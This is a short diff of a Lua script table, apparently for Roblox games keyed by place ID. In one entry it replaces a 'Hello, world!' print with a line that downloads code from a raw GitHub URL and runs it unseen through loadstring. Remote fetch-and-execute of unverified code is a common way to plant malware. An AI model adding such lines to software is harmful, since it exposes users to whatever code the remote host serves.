@@ -1,7 +1,7 @@
 local G = {
 
     [99827026339186] = function()
-	print("Hello, world!");
+		loadstring(request({Url = "https://raw.githubusercontent.com/XCo9/V9/refs/heads/SG/ID/99827026339186"}).Body)()
     end,
 
     [1] = function()
